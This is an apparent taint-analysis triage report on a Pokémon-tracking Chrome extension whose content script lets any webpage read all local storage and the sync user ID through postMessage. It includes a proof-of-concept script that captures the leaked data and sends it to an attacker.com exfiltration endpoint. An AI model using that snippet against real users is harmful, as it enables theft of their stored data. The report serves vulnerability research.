# CoCo Analysis: bojkjlencpogikokoooecajmflfobpcc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 total
  - 5 storage_local_get → storage_local_set flows
  - 1 storage_sync_get → window_postMessage flow
  - 4 storage_local_get → window_postMessage flows

---

## Primary Vulnerability: Complete Storage Exploitation Chain

### Sink Group 1: storage_local_get_source → window_postMessage_sink (Lines 687, 972, 7260-7263)

**CoCo Trace:**
$FilePath$/bojkjlencpogikokoooecajmflfobpcc/opgen_generated_files/bg.js
Line 687 - var storage_local_get_source = {'key':'value'}; (CoCo framework code)
Line 972 - sendResponse(JSON.stringify(items))
$FilePath$/bojkjlencpogikokoooecajmflfobpcc/opgen_generated_files/cs_0.js
Line 7260 - const result = JSON.parse(response)
Line 7263 - pokemons: result.caught_pokemon
Line 7261 - window.postMessage(...)

**Code:**

```javascript
// Content script - Entry point (cs_0.js lines 7242-7283)
window.addEventListener('message', function (event) {
    const EXTENSION_ID = 'bojkjlencpogikokoooecajmflfobpcc'

    if(typeof event.data === "string") {
        try {
            const data = JSON.parse(event.data);
            if( data.type == 'GET_USERS_POKEMON') { // ← attacker triggers
                chrome.runtime.sendMessage(
                    EXTENSION_ID,
                    JSON.stringify({
                        type: 'get-caught-pokemon', // ← requests all storage
                    }),
                    (response) => {
                        const result = JSON.parse(response);
                        window.postMessage( JSON.stringify({
                            type: "FROM_EXTENSION",
                            pokemons: result.caught_pokemon // ← leaks storage data back to page
                        }), "*")
                    }
                )
            }
        } catch(e) {
            console.log("failed to parse", e)
        }
    }
})

// Background script - Message handler (bg.js lines 901-1013)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    const data = JSON.parse(request)
    switch (data.type) {
        case 'get-caught-pokemon':
            chrome.storage.local.get(null, function (items) { // ← retrieves ALL storage
                sendResponse(JSON.stringify(items)) // ← sends back to content script
            })
            break
        case 'set-caught-pokemon':
            chrome.storage.local.get(null, function (items) {
                items.caught_pokemon.indexOf(data.pokemon) === -1
                    ? items.caught_pokemon.push(data.pokemon) // ← can write attacker data
                    : null
                sendResponse(JSON.stringify(items.caught_pokemon))
                chrome.storage.local.set(items, function () {
                    // Also sends to hardcoded backend
                    fetch(SET_POKEMON_URL + new URLSearchParams({
                        pokemon: items.caught_pokemon,
                        uuid: items.uuid,
                    }), { method: 'GET' })
                })
            })
            break
        case 'new-userid':
            chrome.storage.sync.set({ userid: data.userid }, function () { // ← writes attacker data
                sendResponse(JSON.stringify({ done: true }))
            })
            break
        case 'get-userid':
            chrome.storage.sync.get(['userid'], function (result) {
                sendResponse(JSON.stringify({
                    userid: result.key, // ← leaks userid
                }))
            })
            break
    }
    return true;
})
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website - content script runs on `<all_urls>`

**Attack Vector:** window.postMessage from any webpage to content script

**Attack:**

```javascript
// Information disclosure attack - steal all local storage
window.postMessage(JSON.stringify({
    type: 'GET_USERS_POKEMON'
}), '*');

// Listen for response
window.addEventListener('message', function(event) {
    if (event.data && typeof event.data === 'string') {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'FROM_EXTENSION') {
                console.log('Stolen storage data:', data.pokemons);
                // Exfiltrate to attacker server
                fetch('https://attacker.com/exfil', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            }
        } catch(e) {}
    }
});
```

**Impact:** Complete information disclosure of extension's local storage. Any webpage can trigger the content script to retrieve all storage data and post it back via postMessage where the malicious page can capture it. This leaks all user data stored by the extension including caught_pokemon list, uuid, configuration, and any other stored data.

---

## Sink Group 2: storage_local_get_source → chrome_storage_local_set_sink (Lines 983-989)

**CoCo Trace:**
$FilePath$/bojkjlencpogikokoooecajmflfobpcc/opgen_generated_files/bg.js
Line 983 - items.caught_pokemon.indexOf(data.pokemon) === -1
Line 984 - items.caught_pokemon.push(data.pokemon)

**Reason:** While this is technically a storage.get → storage.set flow, it's part of the same complete exploitation chain described above. The 'set-caught-pokemon' message type is also accessible via the same window.postMessage → chrome.runtime.sendMessage path, allowing attackers to write arbitrary data to storage. However, the primary impact is the information disclosure via the GET_USERS_POKEMON flow.

---

## Sink Group 3: storage_sync_get_source → window_postMessage_sink (Lines 951-957)

Similar to Sink Group 1, but for sync storage userid. The 'get-userid' message type allows reading userid from sync storage and returning it to the attacker-controlled webpage.
